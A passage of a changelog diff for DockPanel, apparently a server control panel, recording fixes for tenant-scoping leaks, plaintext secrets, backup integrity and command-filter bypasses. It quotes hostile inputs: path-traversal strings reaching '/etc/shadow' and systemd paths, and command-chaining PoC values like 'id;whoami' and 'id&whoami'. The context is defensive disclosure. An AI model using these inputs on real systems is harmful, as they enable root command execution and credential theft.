+containing a multi-byte character. Hit from `create_secret` and
+`update_secret`'s responses (the row is committed to Postgres before the
+panic, so the secret is saved but the response is lost) and every
+subsequent `list_secrets` call with `reveal=false`, permanently breaking
+that vault's default masked listing until the offending secret is deleted
+via `reveal=true`. Fixed by walking `.chars()` instead of byte indices,
+which can't straddle a boundary by construction.
+
+New pin suites: `tests/escalation-user-route-scope-pin-e2e.sh` (13
+assertions), `tests/git-clone-ssrf-pin-e2e.sh` (16 assertions),
+`tests/secrets-mask-value-boundary-pin-e2e.sh` (10 assertions) — 39 total,
+all mutation-tested via full revert and, for every position-sensitive
+assertion (8 of them), an individually targeted decoy mutation confirming
+that assertion alone catches its specific defect.
+
+## [2.197.0]
+
+### Fixed — backup encryption had no integrity check; DB passwords could be typed as plaintext CLI arguments
+
+Two defense-in-depth gaps deferred from the v2.196.0 audit round, closed
+this session:
+
+`panel/agent/src/services/encryption.rs` encrypted database backups with
+AES-256-CBC and nothing else (CWE-353). PKCS7 padding bounds only the final
+ciphertext block, so a bit-flip anywhere earlier decrypted silently into
+corrupted plaintext instead of failing — a backup that looked fine and
+imported wrong, or not at all, with no signal pointing at corruption.
+`openssl enc` on this project's target OpenSSL (3.0+) refuses AEAD ciphers
+outright ("AEAD ciphers not supported"), so GCM was never an option here
+despite `docs/guides/backup-orchestrator.md` having claimed it for some
+time. Fixed with encrypt-then-MAC: `encrypt_file` now appends a 32-byte
+HMAC-SHA256 tag over the ciphertext, keyed by a passphrase-derived subkey
+independent of the AES key `openssl -pbkdf2` derives internally.
+`decrypt_file` verifies that tag *before* the ciphertext is ever handed to
+openssl, so a corrupted or tampered backup is rejected outright rather than
+decrypted into wrong bytes. A backup encrypted before this fix has no tag;
+it is detected by the trailer's absence and still decrypts, unauthenticated,
+for backward compatibility.
+
+`dockpanel db create` and `dockpanel backup db-create` took the database's
+root/admin password as a required `--password <VALUE>` clap flag (CWE-214):
+visible to any local user via `ps`/`/proc/<pid>/cmdline` for the life of the
+process, and left behind in shell history. `--password` still works
+(existing scripts keep working), but a new `--password-stdin` reads the
+value from stdin instead, and when neither flag is given the CLI now
+prompts interactively with masked input.
+
+New pin suites `tests/backup-encryption-integrity-pin-e2e.sh` (18
+assertions, including a live round trip against the real `openssl` binary
+proving the tamper-detection actually catches a flipped ciphertext byte) and
+`tests/cli-password-args-pin-e2e.sh` (18 assertions). Both mutation-tested:
+a full revert turns every non-control arm red, and every position arm was
+independently defeated by a targeted decoy mutation to confirm it measures
+ordering, not just presence.
+
+## [2.196.0]
+
+### Fixed — one admin could take over another administrator's account and inherit their entire server fleet
+
+Every mutation in `routes/users.rs` was gated on `AdminUser` alone (a role
+check, nothing else), so any two administrator accounts on the same install
+were fully interchangeable: `reset_password` and `update`'s password branch
+could set another admin's password with no code or consent from them,
+`remove` deleted a peer admin and auto-transferred every server they had
+registered to the caller in the same transaction, and `toggle_suspend` could
+lock a peer admin out unilaterally. Multiple administrators is a real,
+supported configuration — `docs/guides/roles-and-ownership.md` already
+describes a per-admin hardware boundary for sites ("does not extend to a
+machine another administrator added"), and v2.185.0 fixed a second-admin
+visibility bug elsewhere in this same arc. A new `is_other_admin` guard now
+blocks `update`, `reset_password`, `remove` and `toggle_suspend` from acting
+on any account whose current role is `admin`, other than the caller's own.
+`list`, `create` and `reset_2fa` are unchanged: listing the directory or
+minting a new account can't hand over an existing one, and clearing a 2FA
+factor doesn't by itself grant sign-in — it remains the only recovery path
+for an administrator who has lost both their authenticator and their
+recovery codes. Found by a `dockpanel-fanout` completeness-critic pass while
+auditing sibling tenant-scoping fixes from the same arc; not currently
+exploitable on demo.dockpanel.dev (only one admin account exists there
+today).
+
+## [2.195.0]
+
+### Fixed — docker_apps.rs registry/ollama handlers had no argv-position validation
+
+`registry_login`/`registry_logout` passed the admin-supplied registry `server`
+straight into `docker login`/`docker logout` with only an emptiness check —
+a server starting with `-` is parsed by docker's own CLI as a flag in that
+position, not a registry host. Both now validate with `is_valid_image_ref`,
+the same validator already used a few hundred lines away for `change_image`'s
+`image` field. `ollama_pull_model`/`ollama_delete_model` already validated
+model-name length and character class but were missing the equivalent
+leading-`-` guard before `docker exec ... ollama pull/rm <model>`; both now
+reject a leading `-`, matching `is_valid_image_ref`'s existing behavior for
+the same threat class. All four are DiD-only (admin-authority endpoints;
+`safe_command`'s `.args()` already rules out shell injection) — named
+alongside the (now closed) `on_call`/`escalation_policies` tenant-scoping fix
+in `project_dockpanel_tech_debt_p4`'s long-standing carry list.
+
+## [2.194.0]
+
+### Fixed — closed the last two defense-in-depth gaps from the s436 audit round
+
+`nginx.rs`'s `clone_site`, `get_env` and `set_env` were 3 of ~28 domain-taking
+agent handlers that skipped `is_valid_domain` while every sibling calls it
+first. Not reachable via the panel API today — every current caller sources
+its domain from a DB-validated column — but the live systemd unit's
+`ReadWritePaths` allowlist includes `/etc/systemd/system` and
+`/var/spool/cron`, so an unvalidated domain segment
+(`../../etc/systemd/system`) would have been root code execution via
+cron/systemd-unit overwrite, not merely a stray file write. All three now
+call `is_valid_domain` first, matching the other 25 handlers in the file.
+
+`remote_backup.rs`'s `upload()` gated the backup filepath with a lexical
+`starts_with()` check that `/var/backups/dockpanel/../../etc/shadow`
+satisfies — the OS resolves the `..` on open. `ProtectSystem=strict` blocks
+writes outside the agent's allowlist but not reads, so this would have been
+arbitrary root-readable-file exfiltration (shadow, Let's Encrypt private
+keys, `.env` secrets) to an attacker-supplied S3/SFTP destination. Now
+rejects any filepath containing `..`, matching the pattern `git_build.rs`'s
+`is_valid_dockerfile`/`is_valid_build_context` already use elsewhere in the
+same crate.
+
+New pin (`nginx-clone-env-backup-path-pin-e2e.sh`) mutation-tested against
+two defeats: a full revert to pre-fix source (8 of 12 arms correctly went
+red) and a split-guard dead-code mutation on the backup path check (only the
+structural arm caught it — the text-presence arm stayed green).
+
+## [2.193.0]
+
+### Fixed — on-call schedules and escalation policies had zero tenant scoping
+
+`on_call_schedules` and `escalation_policies` have carried no `user_id`
+column at all since they shipped: every route gated on `AdminUser` (role)
+alone, so any admin on the install could list, read, write or delete every
+OTHER tenant's on-call rotations and escalation policies. Confirmed
+UI-reachable (`Alerts.tsx`, `Settings.tsx`); zero realized harm on this box
+(0 rows, 1 admin) but a real cross-tenant leak/write on any install with a
+second admin — the exact bug class this project's last several releases
+fixed repeatedly elsewhere, just never swept in this pair.
+
+Added `user_id` to both tables via a migration that backfills existing rows
+from real tenant provenance (the `alert_rules` row that references a policy,
+then the policy that references a schedule), falling back to the install's
+first user, matching the precedent `20260830000000_status_page_subscribers_owner.sql`
+set. Every CRUD route in `on_call.rs`/`escalation_policies.rs` now scopes to
+the caller's own tenant, never widening for admin (matching how a
+caller-supplied-ID resource is scoped elsewhere in this codebase).
+
+Two adjacent gaps found and closed in the same pass, both in the same
+feature family: `validate_schedule_routes` only checked that a referenced
+on-call schedule *existed*, not that the caller owned it — a policy could
+otherwise legitimately reference, and therefore page, another tenant's
+rotation. And `alerts.rs::attach_escalation_policy` — the one write path
+that couples an alert rule to an escalation policy — had no ownership check
+at all on either side, so any admin could re-point any tenant's alert rule
+at any policy.
+
+The new regression pin (`client-role-and-server-ownership-pin-e2e.sh`,
+extended rather than duplicated — it already owned this exact defect shape)
+was mutation-tested against three defeats before shipping: a full revert to
+the pre-fix source (24 arms correctly went red), a dead-code wrap of the
+`attach_escalation_policy` ownership check (only the brace-depth liveness
+arm caught it — the text-presence/ordering arms stayed green, same lesson
+v2.189.0 learned the hard way), and a `.bind()` order swap (only the
+bind-order arm caught it).
+
+## [2.192.0]
+
+### Fixed — updating an app's image or env silently disabled its auto-sleep setting
+
+`update_app`, `update_image`, and `update_env` all stop, remove, and
+re-create the container to apply a change — which mints a brand new Docker
+container id while keeping the same name. `container_sleep_config` is keyed
+on `container_id` alone, so after any of these ordinary actions the row
+became permanently unreachable under its old id: `GET .../sleep-config`
+read it back as "not configured" and the auto-sleep sweeper's
+`WHERE auto_sleep_enabled = true` query never found it again. An operator
+who enabled auto-sleep, then later updated that app's image or environment
+variables — routine maintenance, not an edge case — silently lost the
+setting with no error and no indication anything had changed.
+
+This is the second half of a fix `container_expected_stops`
+(20260822000000) already made for a sibling problem: that migration's own
+comment names all three functions and explains why a new table had to key
+on `(server_id, container_name)` instead of `container_id` for exactly this
+reason. `container_sleep_config` predates that fix and wasn't updated
+alongside it.
+
+Fixed by re-pointing the existing `container_sleep_config` row at the new
+container id immediately after each of the three recreates, reading the id
+from the same agent response the handler already receives. No schema
+change, no re-keying scheme — the row's `container_id` column simply stays
+accurate through an update, the same way every other read/write site in
+this file already expects it to.
+
+## [2.191.0]
+
+### Fixed — passkey RP-ID/origin derivation now fails closed instead of defaulting to "localhost"
+
+`get_rp_id_from_headers`/`get_rp_origin_from_headers` prefer the operator's
+`BASE_URL` config when set, falling back to the request's `Origin` (then
+`Host`) header when it isn't — a legitimate, common configuration for
+IP-based access, not a misconfiguration. Their own doc comment claimed this
+"prevent[s] RP ID manipulation by attackers," which overstated the guarantee:
+if a request had neither header at all, both functions silently defaulted to
+a hardcoded `"localhost"`/`"https://localhost"` rather than refusing. Flagged
+by a completeness critic at s429 as non-exploitable as reported —
+`register_complete`/`auth_complete` independently compare the browser's own
+signed `clientDataJSON.origin` against whatever these functions return, and
+that comparison is bound to the page's real origin via the authenticator's
+signature, not to anything a header-only attacker controls — but the code
+should fail closed to match what its comment already claimed.
+
+Fixed: both functions now return `Result<String, ApiError>`; the one
+remaining fallback (neither `Origin` nor `Host` present, which no real
+browser-driven WebAuthn ceremony produces) refuses the request instead of
+substituting a value that satisfied nothing. The comment now states the
+actual trust model instead of overstating it. No behavior change for any
+real client.
+
+## [2.190.0]
+
+### Fixed — the backup-encryption passphrase was a literal substring of the auth signing secret
+
+`derive_backup_encryption_key` (policy-driven database backups, when
+"Encrypt" is enabled) derived its passphrase as
+`format!("backup-enc-{}", &jwt_secret[..32])` — 32 raw bytes of `JWT_SECRET`,
+the same secret every session token on the install is HMAC-signed with.
+Anyone who learned a backup passphrase (a leaked backup file's metadata, a
+log, a debug dump) learned enough of `JWT_SECRET` to forge sessions for
+every user, coupling the blast radius of "one old backup leaked" to "every
+account on this install is compromised". The passphrase-stretching step
+itself (`openssl enc -aes-256-cbc -pbkdf2 -iter 100000`) was always fine;
+the defect was the passphrase's *value*, not how it was stretched.
+
+Fixed by deriving the passphrase via HKDF-SHA256 instead
+(`secrets_crypto::derive_backup_encryption_key_v2`, its own domain-separated
+salt, hex-encoded) — a one-way PRF, so the passphrase reveals nothing about
+`JWT_SECRET` and vice versa. Migration-safe: a new
+`database_backups.encryption_key_version` column records which derivation
+actually encrypted a given file at write time (existing rows default to `1`,
+the legacy scheme every one of them actually used), and restore looks up
+that row's own version rather than assuming "whatever the current
+derivation is" — so a backup encrypted before this release stays restorable
+after it ships, and a future re-derivation (should one ever be needed) can
+follow the same versioned pattern without stranding anything encrypted
+under an earlier scheme.
+
+An adversarial review of the new regression pin (`backup-truth-pin-e2e.sh`
+§13), run twice, found and this release fixed five separate ways a
+text-presence-only check could be satisfied by broken code: a same-named
+stub for the legacy function, a decoy reference elsewhere in the file
+satisfying an unrelated `grep`, aliasing a variable before slicing it
+(reproducing the exact leak under a different spelling), a hardcoded bind
+value that happened to match today's version number, and a hardcoded
+"current version" argument sitting next to an unrelated log line that
+merely *mentioned* the correct field. Every arm now checks the specific
+function's own body and, where a value is bound, the actual value bound —
+never "does this text appear somewhere in the file" — and each was
+re-verified by planting the exact defeating mutation and confirming red,
+then restoring and confirming green.
+
+## [2.189.0]
+
+### Fixed — any authenticated user could write alert rules for a server they don't own
+
+`PUT /api/alert-rules/{server_id}` and `DELETE /api/alert-rules/{server_id}`
+took `server_id` straight from the URL under plain authentication, with no
+check that the caller actually owns that server. `upsert_rules`'s own
+existence lookup (`WHERE user_id = $1 AND server_id = $2`) meant a
+non-owner's write never touched the real owner's row — it silently
+inserted a *second*, independent row for that `server_id` instead, since
+`alert_rules` only enforces `UNIQUE(user_id, server_id)`, not
+`UNIQUE(server_id)`. That stray-row possibility is exactly what
+v2.188.0's `fetch_alert_rules` fix had to defend against in the drift
+report; this release closes the gap at its source instead of only
+containing its effect. The delete route had the same missing check —
+harmless to the real owner's row (its own `DELETE` was already scoped to
+the caller), but it silently answered `{"ok": true}` for a server_id the
+caller doesn't own or that doesn't exist. Both routes now check ownership
+up front (`SELECT id FROM servers WHERE id = $1 AND user_id = $2`,
+returning 404 otherwise), the same shape `metrics.rs::server_metrics`
+already uses for a path-supplied `server_id`. No frontend caller reaches
+either route today — found by an adversarial review of the previous
+release's diff, not by a user report.
+
+A second adversarial review of THIS diff, before shipping, proved the new
+regression pin was itself defeatable: wrapping the entire ownership check in
+`if false { ... }` — leaving the write completely unguarded — left every
+text-presence-and-ordering assertion green, because none of them verified
+the check was actually *live* code rather than dead code containing the same
+text. Also caught: swapping the two `.bind()` calls (`$1`/`$2` would then
+compare the wrong columns) left the pin green too. Both are now pinned
+directly — a brace-depth check that the ownership lookup sits at the
+top level of the function body, not inside a dead branch, plus an explicit
+bind-order check. The review also flagged that this fix's own reasoning
+comment, if read as a blanket "reads widen for admin, writes never do" rule,
+is an inaccurate generalization — `metrics.rs::server_metrics` is a read
+that doesn't widen, and `helpers::SITE_CALLER_PREDICATE` is a write that
+does (for sites, where the owner and the server's registering admin can
+legitimately differ). The comment now states the actual verified rule: a
+single resource resolved by a caller-supplied ID never widens for anyone,
+regardless of read or write; what widens for admin is a fleet-wide aggregate
+with no mandatory per-resource ID.
+
+## [2.188.0]
+
+### Fixed — six more admin views under-reported for every admin except whoever registered the servers
+
+`servers::list`'s own SCOPE LIMIT note (added when that route was fixed)
+named seven sibling reads that still resolved a machine through
+`servers.user_id` — a column that names whoever *registered* the row, not a
+tenant boundary — and so still under-reported for a second administrator.
+v2.185.0 closed the first, `dashboard::fleet_overview`. This release closes
+the remaining six: `routes/drift.rs`'s `servers()` and `report()` (the
+config-drift picker and report), `services/drift.rs`'s five report fetchers
+(one logical site — reachable only from that same admin-gated route), and
+three more `routes/dashboard.rs` aggregations: `metrics_history`,
+`gpu_metrics_history`, and `timeline`.
+
+A second admin — one who didn't personally register the servers, which on
+a multi-admin install is most of them — saw an empty drift-comparison
+picker, a drift report that silently dropped rows for every server they
+didn't register, empty CPU/memory/disk/GPU history charts, and an activity
+timeline missing every deploy, backup, incident, alert, and security scan
+for those servers. None of these are cross-tenant leaks; all six are
+under-reports of data the caller was already fully entitled to see through
+every other route.
+
+Fixed per caller shape, following the two patterns this codebase had
+already established for the same bug class: the two `drift.rs` routes and
+`services/drift.rs`'s fetchers are `AdminUser`-only, so (as with
+`fleet_overview`) the owner filter is simply dropped — every caller here is
+an admin, so the comparable/reportable set is the whole fleet.
+`metrics_history`, `gpu_metrics_history`, and `timeline` also serve
+non-admin roles, so they widen conditionally with a bound
+`$N::uuid IS NULL OR user_id = $N` predicate, mirroring
+`dashboard::intelligence`'s own established idiom for exactly this
+distinction — an admin gets the fleet-wide read, a non-admin is unchanged.
+
+An adversarial review of this diff caught a correctness regression the fix
+itself would have introduced: `services/drift.rs`'s `fetch_alert_rules`
+relied on its own (now-removed) `user_id = $1` filter to accidentally
+guarantee at most one `alert_rules` row per `server_id` — the table only
+enforces `UNIQUE(user_id, server_id)`, not `UNIQUE(server_id)`. Collapsing
+unfiltered rows into a map keyed by `server_id` would have let a stray row
+from an unrelated account silently stand in for the server's real posture in
+the drift report. Fixed by joining against the server's actual owner instead
+of dropping the filter outright, so the report always resolves to the one
+row that belongs to that server, independent of any stray rows. (The write
+path that lets a stray row exist in the first place — `alerts.rs::update_server_rules`/
+`delete_server_rules` take `server_id` from the URL with no ownership check —
+is a separate, pre-existing gap and remains open.)
+
+## [2.187.0]
+
+### Fixed — five more webhook/verify secrets were stored in plaintext
+
+`deploy_configs.webhook_secret`, `git_deploys.webhook_secret`,
+`extensions.webhook_secret`, `whmcs_config.webhook_secret`, and
+`webhook_endpoints.verify_secret` were plain columns, the sibling gap to
+v2.186.0's notification-secrets fix — flagged in the same audit and
+deferred to this release.
+
+Fixed the same way: encrypted at rest with `secrets_crypto::encrypt_credential`
+and decrypted on every read path that needs the plaintext (HMAC signing for
+`extensions.webhook_secret` and `webhook_endpoints.verify_secret`; a
+constant-time compare for the other three). Three of the five columns
+(`deploy_configs.webhook_secret`, `git_deploys.webhook_secret`,
+`webhook_endpoints.verify_secret`) were sized for the plaintext only —
+base64(nonce + ciphertext + tag) is longer than what it wraps, so encrypting
+in place without first widening them to `TEXT` would have overflowed the
+column and failed every write. `credential_reencrypt.rs`'s re-key sweep now
+covers all five.
+
+`deploy_configs.webhook_secret` and `git_deploys.webhook_secret` are
+displayed to the operator on every page load (the git-host webhook URL to
+paste into GitHub/GitLab), not shown once at creation — so both decrypt on
+every read path (`list`, `get`, `create`) rather than following the
+show-once-then-mask pattern used elsewhere in this codebase.
+
+## [2.186.0]
+
+### Fixed — PagerDuty keys and Slack/Discord/generic webhook URLs were stored in plaintext
+
+`alert_rules.notify_pagerduty_key`/`notify_webhook_url`/`notify_slack_url`/
+`notify_discord_url` and `monitors.alert_slack_url`/`alert_discord_url` were
+plain columns with no reference to this codebase's own credential-encryption
+service anywhere in the files that wrote or read them — flagged in an
+internal audit roughly 180 sessions ago as "the one cleartext credential
+hole left in the panel" and never addressed. A full-database backup or a
+read-only leak of these tables would have exposed real third-party
+credentials in the clear.
+
+Fixed by encrypting all six columns at rest with `secrets_crypto::encrypt_credential`
+(the same primitive already used for DB passwords, DKIM keys, and API
+tokens elsewhere in this codebase) and decrypting on every read path —
+`decrypt_credential_or_legacy` where the caller has the panel's config
+(so a same-account read, e.g. re-opening the settings form, still shows
+the value), `decrypt_credential_from_env` where it doesn't (the
+notification-delivery code paths, which only ever had a database
+connection). `credential_reencrypt.rs`'s existing re-key sweep now covers
+all six columns, so a `SECRETS_ENCRYPTION_KEY` rotation reaches them too.
+Zero adoption on this install prior to the fix (both tables had no rows
+using these columns), so no migration was required for correctness beyond
+the legacy-plaintext fallback already built into `decrypt_credential_or_legacy`.
+
+## [2.185.0]
+
+### Fixed — an unauthenticated public status-page route leaked every tenant's monitor data
+
+`monitors::status_page` (`GET /api/status-page`) was created from scratch at
+v2.173.0 — two releases after the *identical* bug was found and fixed in the
+sibling `incidents::public_status_page` (v2.171.0) — with the same unscoped
+query the earlier fix had just closed one file over: `SELECT ... FROM
+monitors WHERE enabled = true`, no owner filter, behind a comment reading
+"no user filter — this is public." On any multi-tenant install, a bare,
+anonymous request to this route returned every OTHER tenant's monitor
+names, up/down status, response times, and last-checked timestamps — no
+authentication, no privilege of any kind required. No frontend caller ever
+reaches this route, which is exactly why it went unnoticed while its twin
+got fixed and pinned. Fixed by resolving the status page's owner the same
+way the sibling route already does (`public_status::resolve_current_status_page_owner`)
+and requiring it before the query can run at all.
+
+### Fixed — the Fleet dashboard was empty for every admin except whoever registered the servers
+
+`dashboard::fleet_overview` (`GET /api/dashboard/fleet`, admin-only)
+filtered `WHERE s.user_id = $1` — the same bug class `servers::list` was
+fixed for previously ("An administrator sees every machine; anybody else
+sees the ones they hold"). `servers.user_id` names whoever registered the
+row, not a tenant boundary, so a second administrator opened the Fleet
+dashboard to zero servers, zero sites, zero alerts, despite being a full
+admin who could reach every one of those servers through every other route.
+Fixed by widening both queries in the handler to be fleet-wide, matching
+the established convention elsewhere in this codebase.
+
+## [2.184.0]
+
+### Fixed — the cron/shell-command chaining fix in v2.183.0 was itself incomplete: bare `&` still bypassed it
+
+v2.183.0 closed a chaining bypass in `is_safe_cron_command` (agent) and
+`is_safe_shell_command` (backend, shared by cron, `pre_build_cmd`, and
+`post_deploy_cmd` validation) for bare `;` and bare `|`, but never checked the
+third POSIX chaining operator: a bare `&` (`"id&whoami"`) passed both filters
+untouched, with the identical reachability and severity as the bug that had
+just been fixed — a non-admin site owner could save a cron command, hit "run
+now," and have it executed by `bash -c` as the agent's root-equivalent
+process. Found hours after v2.183.0 shipped by a completeness critic that
+compiled and ran standalone copies of both functions outside the repo,
+proving the bypass with an executed PoC (with the `;`/`|` REJECT behavior
+kept as controls). Fixed with the same remedy shape already used for `|`:
+scan runs of `&` and reject anything that isn't exactly a paired `&&` — the
+documented `&&`/`||` legitimate-chaining case keeps working. Mutation-tested:
+a targeted in-place revert (not a whole-file stash, since the new tests live
+in the same two files as the fix) confirmed both new unit tests red against
+the disabled guard, then green against the restored one.
+
+### Fixed — `list_volume_backups` leaked every admin's volume-backup metadata to every other admin
+
+The endpoint was a flat, unscoped `SELECT * FROM volume_backups` gated only
+by `AdminUser` — no `server_id`/`user_id` filter at all — unlike its sibling
+`list_db_backups`, which has always scoped by the caller's own sites. Any
+admin account (DockPanel supports more than one; any admin can promote
+another user to `role='admin'`, a routine action) could see every other
+admin's container/volume names, filenames, sizes, sha256 hashes, timestamps,
+and server IDs on their own dashboard. Confidentiality-only — the restore
+endpoint was already correctly scoped, so a leaked backup id could not be
+used to trigger someone else's restore. Fixed by scoping the list query the
+same way restore already scopes its own lookup: `server_id` joined against
+`servers` with `is_local OR user_id = caller`. Found and independently
+skeptic-confirmed (including a live production-DB check distinguishing
+realized from prospective exposure) by an audit-coverage fan-out.
+
+### Fixed — a valid-but-empty backup archive could silently wipe a live Docker volume with no rollback
+
+`restore_volume`'s existing corruption guard (`tar tzf ... || exit 3`) caught
+a truncated or corrupt `.tar.gz` but not a syntactically valid, zero-member
+one — `tar tzf` exits 0 on an empty archive, so the wipe (`rm -rf
+/volume/*...`) still ran, leaving the volume empty with no way back. Fixed
+with a second, separate archive-member count (`tar tzf | wc -l`, kept apart
+from the corruption check so a short-circuiting match can never mask a
+mid-listing failure as success) that must be greater than zero before the
+wipe proceeds. Verified with real `docker run` executions against scratch
+Docker volumes: an empty archive is now rejected with the volume untouched, a
+real archive still restores correctly, and a truncated archive is still
+caught by the original guard (regression control).
+
+## [2.183.0]
+
+### Fixed — a cron/pre-build/post-deploy command could chain a second command past the safety filter, as root
+
+`is_safe_cron_command` (agent) and `is_safe_shell_command` (backend, shared by
+cron, pre_build_cmd, and post_deploy_cmd validation) only rejected `"; "`
+(semicolon *plus a trailing space*) and verb-anchored `"|sh"`/`"|bash"`
+patterns — a bare `;` or bare `|` with nothing after it (`"id;whoami"`,
+`"id|whoami"`) passed both filters untouched. A cron command reaches root's
+real crontab (`crontab -u root -`) and can also be run immediately via
+`POST /crons/run` (`bash -c`, unsandboxed, as the agent), reachable by the
+non-admin owner of the site the cron belongs to — not just an admin. Fixed by
+rejecting any bare `;` outright and scanning runs of `|`, rejecting anything
+that isn't exactly a paired `||` — the documented `&&`/`||` legitimate-chaining
+case keeps working. Found by an audit-coverage fan-out, independently
+re-verified against live source (including the exact PoC strings) before
+shipping, and mutation-tested (new unit tests on both sides confirmed red
+against the pre-fix code, green against the fix).
+
+### Fixed — the Dozzle sidecar had no authentication in front of it
+
+The v2.179.0 docker-socket-proxy sidecar correctly restricted *what* Dozzle
+could ask the shared Docker daemon (deny-by-default ACL — list/inspect/events
+only, no exec, no writes) but nothing restricted *who* could reach Dozzle
+itself. Deploying the template with a domain — the panel's own advertised
+one-click way to use it — produced a fully public page listing and
+inspecting every container on the shared host, including plaintext
+environment variables (database passwords, JWT secrets, ...) for every other
+project sharing that box. Dozzle's own authentication needs either a mounted
+`users.yml` (bcrypt hash inside) or a forward-proxy header scheme — verified
+against Dozzle's own documentation; no plain-env-var auth exists, so a
+required template env var could not have closed this. Fixed by forcing nginx
+`auth_basic` on the domain at deploy time for any sidecar-backed template,
+reusing the same htpasswd mechanism Sites' own password-protection feature
+already uses; the generated one-time credentials are surfaced in the deploy
+log and logged to System Logs as a durable backup. Known gap, tracked as a
+fast-follow: no self-service UI yet to view or rotate the generated password.
+
+## [2.182.0]
+
+### Fixed — Git Deploy's pre-build command ran as root on the host, not inside the build container
+
+`POST /git/pre-build-hook` ran a whitelisted install command (`npm install`,
+`pip install -r requirements.txt`, `cargo build --release`, etc.) via a host
+shell in the repo's checkout directory, and the agent runs unsandboxed as
+root. The whitelist blocked shell-injection into the command string, but not
+the named commands themselves being standard supply-chain-RCE vectors —
+`npm`/`pip`/`composer`/`bundle`/`cargo` all run installer or build-script
+hooks (`package.json` postinstall, `setup.py`, `build.rs`, ...) that execute
+arbitrary code. Arming any one of them for a git deploy meant every
+subsequent repo push, and every transitive dependency, ran as root on the
+panel host, unattended. The route is now deleted: the same whitelisted
+command is instead spliced into the auto-generated Dockerfile's install `RUN`
+line, so it only ever executes inside the `docker build` sandbox every other
+git deploy on this platform already trusts, never a host shell. A pre-build
+command now also skips Nixpacks entirely (previously the host-exec step ran
+unconditionally even after a successful Nixpacks build, silently discarding
+its effect); an agent older than this release refuses a configured pre-build
+command outright rather than silently ignoring it. `build_image`'s Docker
+build also gained `kill_on_drop`, so a timed-out build is actually killed
+instead of orphaned.
+
+## [2.181.0]
+
+### Fixed — a terminal share was readable and revocable by any admin, not just the one who created it
+
+`GET /api/terminal/shares` had no owner scoping at all — on a multi-admin/
+reseller install, any admin could enumerate every OTHER admin's shared
+terminal output and, via the exposed `share_id`, read it through the
+unauthenticated public viewer; `DELETE /api/terminal/share/{id}` had the same
+gap, so any admin could revoke any admin's share by id alone. Both routes are
+`settings`-table rows with no dedicated owner column, so the fix threads the
+creating admin's id through the existing pipe-delimited share value
+(`share_lifetime` now parses `timestamp|owner|content`) and scopes
+`list_shares`/`revoke_share` to the calling admin. The unauthenticated public
+viewer (`GET /api/terminal/shared/{id}`) is unchanged — its link-based access
+was never the gap.
+
+### Fixed — the credential re-encryption sweep could lose a race, and its own history
+
+First-ever audit of `services/credential_reencrypt.rs`. Every subject's
+`SELECT`-then-`UPDATE` had no transaction, lock, or compare-and-swap, so a
+normal write (a database password reset, an agent token rotation, a settings
+save) landing between the sweep's read and its write got silently reverted to
+the stale value the sweep read — worst on `databases` (the panel's stored
+password stops matching the live database) and `servers` (the panel loses its
+own agent dial-out token). Every `UPDATE` now carries a CAS guard on the value
+it read; a row that raced is skipped (not clobbered) and reported in a new
+`raced` count, surfaced in the Settings UI. Separately, `reencrypt_vault_secrets`
+bumped `secrets.version` on every successful re-key with no paired
+`secret_versions` row — deterministic, not race-dependent, desyncing the two
+on every non-racing run — removed, since a pure re-encryption changes no
+content. Also closed: two secret-key lists (`credential_reencrypt.rs`'s
+`DESTINATION_SECRET_KEYS` and `SENSITIVE_SETTINGS_SQL`) were hand-duplicated
+from their real source of truth with nothing tying them together; the former
+is now a direct import, the latter is pinned by a new test.
+
+## [2.180.0]
+
+### Fixed — status-page subscribers had no tenant, so every install's fan-out and admin list were install-wide
+
+`status_page_subscribers` was the one status-page table s418 (v2.171.0) never
+scoped: it carried no `owner_id`, so on any multi-tenant/reseller install
+(this panel's stated market) the fan-out worker mailed every verified
+subscriber for every tenant's incident and monitor notices, and
+`GET /api/status-page/subscribers` returned every tenant's subscriber email
+list to any admin who called it — a real address-book leak, not just a
+notification-noise bug. Documented as a known, deliberate limitation in
+`services/status_notices.rs` since it shipped; tracked since s424.
+
+Fixed by extending s418's own pattern (the "winning" `status_page_config`
+row, `ORDER BY created_at ASC, id ASC LIMIT 1`) to the subscriber table: a new
+`owner_id` column, backed by a migration that backfills existing rows to that
+same winning owner — falling back to the install's first user for the
+(documented, reachable) case where the global publish switch is on but no
+config row has ever been created. `subscribe`/`unsubscribe` now resolve and
+respect that owner; `list_subscribers` scopes to the calling admin, matching
+every sibling status-page admin endpoint; the fan-out worker only mails
+subscribers stamped with the same tenant as the notice's own monitor or
+incident. `status-page-gate-pin-e2e.sh` gained 19 new mutation-tested
+assertions (§H/§I/§J) pinning the scoping at the query, schema and
+call-site level.
+
+## [2.179.1]
+
+### Fixed — the sidecar proxy denied Dozzle its own connection health check
+
+v2.179.0 shipped `DOZZLE_PROXY_ENV` denying `INFO`, reasoning Dozzle's only
+needs were listing containers and streaming logs. Deploying it for real
+against the live demo panel (not just a synthetic probe) found otherwise:
+Dozzle's client calls `GET /info` on every connect to populate the remote
+host's CPU/memory/Docker-version card and decide whether the host is
+"available" at all. With `INFO` denied, every deploy logged `Failed to get
+docker info` and reported the host `available:false`, even though container
+listing worked underneath — it would have shipped looking broken to every
+real user. `/info` returns daemon/host metadata only (OS, CPU count, Docker
+version), no container/image/secret data, so granting it does not reopen the
+vector the sidecar exists to close. Verified before and after on the same
+config: the error is gone and the connection completes cleanly with `INFO=1`.
+
+## [2.179.0]
+
+### Dozzle reinstated behind a Docker-socket-proxy sidecar
+
+v2.178.0 withdrew Dozzle and Portainer because both needed the host Docker socket for their
+entire purpose, and `deploy_app` deliberately never mounts it into any template's own
+container — a full host-escape vector regardless of who is allowed to trigger the deploy.
+Dozzle only ever needed to list containers and read their logs, both of which are safely
+servable through a `docker-socket-proxy` sidecar that holds the real socket instead and
+exposes a `CONTAINERS`-scoped, explicitly deny-by-default slice of the Docker API over a
+network nothing else can reach — the industry-standard pattern for exactly this situation,
+and one Dozzle's own docs already recommend. A new `services::app_sidecar` module gives a
+template a private per-app bridge network and a paired sidecar container; every container
+recreate path (image change, env edit, blue-green update) now re-attaches that network and
+reasserts the client env var, so an update can never silently strand the app back on the
+default bridge. Portainer stays withdrawn permanently: its core purpose needs write-level
+Docker API access that a safe proxy cannot grant without reopening most of the original risk,
+and it is largely redundant with DockPanel's own native Docker Apps management page. Catalogue:
+146 → 147. Filed and tracked on #125.
+
+## [2.178.0]
+
+### Two one-click app templates that could never work under this panel's own security policy, withdrawn
+
+A user reported Dozzle crash-looping with `Could not connect to any Docker Engine` on every
+deploy (#125). Root cause: Dozzle needs the host Docker socket for its entire purpose, and
+`deploy_app` deliberately never mounts it — a prior decision, already recorded in source,
